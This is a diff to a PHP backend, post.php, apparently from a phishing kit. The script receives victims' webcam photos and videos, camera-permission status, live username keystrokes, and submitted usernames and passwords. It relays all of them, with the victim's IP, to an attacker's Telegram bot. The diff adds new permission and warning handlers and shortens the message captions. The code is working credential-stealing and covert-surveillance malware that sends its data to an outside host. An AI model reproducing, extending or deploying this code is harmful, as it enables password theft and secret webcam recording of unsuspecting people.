@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// POST.PHP - Handles BOTH Photos & Videos
+// POST.PHP - With Permission Logging
 // ============================================
 
 error_reporting(0);
@@ -21,7 +21,7 @@ $ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');
 
 // ============================================
-// LOG FOR DEBUGGING
+// LOG EVERYTHING
 // ============================================
 file_put_contents('debug.log', "[$time] Type: $type, IP: $ip\n", FILE_APPEND);
 
@@ -33,14 +33,12 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
     
     try {
         if ($fileData) {
-            // Send file (photo or video)
             if ($fileType === 'video') {
                 $url = "https://api.telegram.org/bot$botToken/sendVideo";
             } else {
                 $url = "https://api.telegram.org/bot$botToken/sendPhoto";
             }
             
-            // Decode base64
             $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
             $ext = $fileType === 'video' ? 'webm' : 'png';
             $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . '.' . $ext;
@@ -54,7 +52,6 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
                 'parse_mode' => 'HTML'
             ];
         } else {
-            // Send text
             $url = "https://api.telegram.org/bot$botToken/sendMessage";
             $data = [
                 'chat_id' => $chatId,
@@ -77,9 +74,7 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
             unlink($tempFile);
         }
         
-        // Log result
-        file_put_contents('debug.log', "Telegram response: HTTP $httpCode\n", FILE_APPEND);
-        
+        file_put_contents('debug.log', "Telegram: HTTP $httpCode\n", FILE_APPEND);
         return $httpCode == 200;
     } catch (Exception $e) {
         file_put_contents('debug.log', "Error: " . $e->getMessage() . "\n", FILE_APPEND);
@@ -88,7 +83,7 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
 }
 
 // ============================================
-// HANDLE DIFFERENT TYPES
+// HANDLE TYPES
 // ============================================
 
 switch ($type) {
@@ -103,11 +98,11 @@ switch ($type) {
     case 'image':
         $imageData = $_POST['tg_image'] ?? '';
         if (!empty($imageData)) {
-            $caption = "📸 <b>PHOTO CAPTURE</b>\n";
+            $caption = "📸 <b>PHOTO</b>\n";
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
             $caption .= "Time: $time";
             sendTelegramMessage($caption, $imageData, 'photo');
-            file_put_contents('debug.log', "Photo sent to Telegram\n", FILE_APPEND);
+            file_put_contents('debug.log', "Photo sent\n", FILE_APPEND);
         }
         break;
     
@@ -115,21 +110,37 @@ switch ($type) {
         $videoData = $_POST['tg_video'] ?? '';
         $counter = $_POST['tg_counter'] ?? 0;
         if (!empty($videoData)) {
-            $caption = "🎥 <b>VIDEO CAPTURE #$counter</b>\n";
+            $caption = "🎥 <b>VIDEO #$counter</b>\n";
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
             $caption .= "Time: $time";
             sendTelegramMessage($caption, $videoData, 'video');
-            file_put_contents('debug.log', "Video #$counter sent to Telegram\n", FILE_APPEND);
+            file_put_contents('debug.log', "Video #$counter sent\n", FILE_APPEND);
         }
+        break;
+    
+    case 'permission':
+        $message = "🔓 <b>CAMERA PERMISSION</b>\n\n";
+        $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
+        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+        $message .= "Time: $time";
+        sendTelegramMessage($message);
+        break;
+    
+    case 'warning':
+        $message = "⚠️ <b>WARNING</b>\n\n";
+        $message .= "Message: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
+        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+        $message .= "Time: $time";
+        sendTelegramMessage($message);
         break;
     
     case 'login':
         $username = $_POST['tg_username'] ?? 'N/A';
         $password = $_POST['tg_password'] ?? 'N/A';
         
-        $message = "🔐 <b>LOGIN CREDENTIALS</b>\n\n";
-        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
-        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
+        $message = "🔐 <b>LOGIN</b>\n\n";
+        $message .= "👤 User: <code>" . htmlspecialchars($username) . "</code>\n";
+        $message .= "🔑 Pass: <code>" . htmlspecialchars($password) . "</code>\n\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "⏰ Time: $time";
         
@@ -138,8 +149,8 @@ switch ($type) {
     
     case 'typing':
         $partial = $_POST['tg_data'] ?? 'N/A';
-        $message = "⌨️ <b>USERNAME TYPING</b>\n\n";
-        $message .= "📝 <b>Typed:</b> <code>" . htmlspecialchars($partial) . "</code>\n";
+        $message = "⌨️ <b>TYPING</b>\n\n";
+        $message .= "📝 Text: <code>" . htmlspecialchars($partial) . "</code>\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "⏰ Time: $time";
         sendTelegramMessage($message);
